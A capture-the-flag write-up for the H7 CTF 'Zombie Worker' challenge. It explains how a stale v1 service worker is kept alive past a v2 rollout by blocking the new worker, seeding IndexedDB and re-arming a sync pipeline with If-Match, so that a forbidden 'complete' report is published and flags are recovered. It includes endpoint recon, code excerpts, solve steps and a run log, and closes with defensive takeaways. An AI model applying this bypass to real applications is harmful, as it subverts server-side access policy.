# Zombie Worker: Resurrecting a Dead Service Worker to Smuggle a v1 Report Past a v2 API

*H7 CTF — ctf.h7tex.com*

📖 Also published on [Medium](https://medium.com/@hxshemalsukar/zombie-worker-resurrecting-a-dead-service-worker-to-smuggle-a-v1-report-past-a-v2-api-db05818045f8)

## Challenge

> Relay keeps field technicians working through unreliable connections. Jobs,
> drafts, and reports continue syncing while a routine client update rolls out.

`Relay` is an offline-first PWA. Sync is entirely owned by a **v1 service
worker**: it stages deliveries in IndexedDB, signs them with a
non-extractable P-256 key, and replays them to `/api/sync/replay`. Two
flags are hidden behind a report that only the v1 pipeline can produce.

## Recon

```
GET  /api/meta                             -> { api_version, build, release_id, semantic_contract }
GET  /api/jobs                             -> JOB-3887 "Telemetry drift report" is the target
GET  /api/jobs/JOB-3887                    -> { job: { report: null | {...} } }
GET  /api/jobs/JOB-3887/report-preference  -> ETag: preference-<revision>
PUT  /api/jobs/JOB-3887/report-preference  -> v1 shape {contract, profile} | v2 shape {contract, scope}
POST /api/sync/worker-key                  -> 201, registers the SW's public key
POST /api/runtime/ready                    -> triggers the v1 -> v2 release rollout
POST /api/sync/plan  {cycle_id}            -> dispatch plan, staged by the v1 SW in transit
POST /api/sync/replay                      -> accepts the SW-signed envelope
POST /api/jobs/JOB-3887/exports            -> 202 {export_id, status_url}
GET  /api/jobs/JOB-3887/exports/<id>       -> { status, package_url }
```

Reading `/assets/relay-v1.js`, `/assets/relay-v2.js`,
`/sw-2026.09.24.1.js`, and `/sw-2026.09.24.2.js` shows three constraints
that shape the whole solve:

**1. Only the v1 worker can publish a `complete` report.** The v2 UI only
ever offers `summary`/`record`; `complete` is unreachable from v2:

```js
// relay-v2.js:114
`<option value="summary">Summary</option><option value="record">Field record</option>`
```

`normalizeDelivery` in the v1 worker builds the envelope from **its own
IndexedDB**, not from the server:

```js
// sw-2026.09.24.1.js:199-201
const storedPreference = await savedReportPackage();
if (!storedPreference?.revision) throw new Error("saved package setting is unavailable");
const packageScope = storedPreference.profile || plan.report_package?.scope || "summary";
```

So the published profile is controlled by whatever is posted to the
worker over `MessageChannel` — the scope sent to the server afterward is
cosmetic.

**2. The v2 worker is fatal if it activates.** `sw-2026.09.24.2.js`
deletes the v1 caches and discards the outbox and signing key on
`activate`. Once it takes control, nothing can ever be replayed.

**3. Replay requires a stable plan.** `signAndReplay` re-fetches
`/api/sync/plan` and demands byte equality with what was staged:

```js
// sw-2026.09.24.1.js:233-238
const authoritative = await fetch("/api/sync/plan", { cache: "no-store" });
const expectedEnvelope = await normalizeDelivery(await authoritative.clone().json(), authoritative);
if (canonicalJson(expectedEnvelope) !== canonicalJson(entry.envelope)) {
  throw new Error("queued sync data no longer matches the saved dispatch plan");
}
```

Every v1 plan mints a fresh `sync_id`, so a v1 plan can never satisfy
that check — the outbox just grows and flush stays `deferred`. Only the
v2 plan is stable within a cycle, so the v1 worker has to be kept alive
to consume a **v2** plan.

## The bug

`POST /api/runtime/ready` rolls the client to release `2026.09.24.2` and,
in the process, resets the report-preference `revision` to `0`:

```
PUT  .../report-preference  -> {"revision":1, "report_package":{"contract":"v1","profile":"complete"}}
POST /api/runtime/ready     -> {"status":"accepted","scheduled":true}
GET  /api/meta              -> {"build":"2026.09.24.2", ...}
GET  .../report-preference  -> {"report_package":{"contract":"v2","scope":"summary"},
                                 "revision":0,"processed_revision":0}
```

With `revision == processed_revision == 0` the dispatch has no pending
work, so `/api/sync/plan` is permanently `409`:

```
{"detail":"dispatch sync is not ready yet"}
```

This isn't a timing race — it never resolves on its own; polling it for
five minutes changes nothing. The fix is to re-introduce a pending
revision *after* the flip, using the same `If-Match` optimistic-concurrency
header the v2 client uses:

```
GET  .../report-preference               -> ETag: preference-0
PUT  .../report-preference   If-Match: preference-0
     {"contract":"relay.report-package/v2","scope":"record"}
                                          -> 200 {"status":"saved","revision":1}
```

Without `If-Match` this PUT returns `422 {"detail":"report preference
contract is invalid"}` regardless of which contract string is sent —
a misleading message that points away from the real cause.

## Solution

1. **Route `sw-2026.09.24.2.js` to a 404** so the v1 worker never loses
   control, then load the page and wait for the v1 worker to activate.
2. **Seed the v1 worker's IndexedDB** with `profile: "complete"` via
   `MessageChannel`, and mirror it to the server in the v1 shape.
3. **Call `/api/runtime/ready`** to flip the release (v1 worker survives;
   preference `revision` resets to 0).
4. **Re-arm the dispatch**: read the new ETag, `PUT` the v2-shaped
   preference with `If-Match`, then re-seed the worker's stored revision.
5. **Poll `POST /api/sync/plan`** until `200`. The v1 worker intercepts
   and stages it; `RELAY_OUTBOX_FLUSH` re-fetches the same stable plan,
   signs the v1/`complete` envelope, and replays it, publishing the
   report and returning the `reconciliation_receipt` (flag 1).
6. **`POST /exports`**, poll to `complete`, download and unzip the
   package for `attachments/commissioning-note.txt` (flag 2).

Full PoC: [`solution/solve.py`](solution/solve.py)

Requires `pip install playwright` and a local Chromium. All requests go
through `page.evaluate(fetch)` — Playwright's `APIRequestContext` can't
drive this app, since `/api/runtime/ready` validates the `Sec-Fetch-*`
headers only a real browser navigation sets.

```
worker: {'build': '2026.09.24.1', 'release_id': 'f0b66f2b6f3b', 'script': '/sw-2026.09.24.1.js'}
ready:   {'s': 200, 'b': '{"status":"accepted","scheduled":true}'}
meta:    {"api_version":"2.0","build":"2026.09.24.2", ...}
pref:    {"report_package":{"contract":"v2","scope":"summary"},"revision":0} etag: preference-0
PUT v2:  200 {"status":"saved","revision":1}

[0] plan=409 rev=1/0 outbox=0   {"detail":"dispatch sync is not ready yet"}
[1] plan=409 rev=1/0 outbox=0   {"detail":"dispatch sync is not ready yet"}
[2] plan=200 rev=1/0 outbox=1
    receipt: H7CTF{...redacted...}
    flush:  {"accepted": 1, "expired": 0, "remaining": 0, "status": "complete"}
PUBLISHED: {"report_package":{"contract":"v1","profile":"complete"}, "report_version": 1, ...}

export: 202 {"export_id":"...", "status":"processing", ...}
zip -> ['report.json', 'attachments/commissioning-note.txt']
```

`attachments/commissioning-note.txt`:

```
Commissioning note
Work order: JOB-3887
Site: North relay station
Observed reading: Clock drift +184 ms · channel 4
Reference: H7CTF{...redacted...}
```

## Notes / gotchas

- `new_context(extra_headers=...)` forces those headers onto *every*
  subresource, including the service-worker script request. Adding
  `Sec-Fetch-*` there makes Chrome reject registration with
  `net::ERR_INVALID_ARGUMENT` — the page renders fine but the worker
  silently never registers. Let the browser set those headers itself.
- `page.evaluate()` has no `timeout` kwarg; passing one raises a
  `TypeError` that, inside a retry loop, looks like a hang.
- `422 "report preference contract is invalid"` is not about the
  contract string — it's the missing `If-Match` header. Both v1 and v2
  contract strings return the same 422 without it.

## Takeaways

- A rollout endpoint that migrates session state is a security boundary
  in its own right — resetting `revision` on flip silently wedges the
  sync pipeline with no client-visible cause.
- `report_package.profile` is authoritative from worker-side IndexedDB
  and only loosely cross-checked server-side, so the client holds the
  real policy decision.
- A replay-integrity check that re-fetches "authoritative" state is only
  as strong as that state's stability; an endpoint that mints a fresh
  identifier per call makes the check permanently unsatisfiable.

## Flags

Flag format: `H7CTF{uuid}`. Flags are dynamic per instance, not static —
the two above are shown redacted; running the PoC against your own
instance will recover your own values for the sync receipt and the
commissioning note.
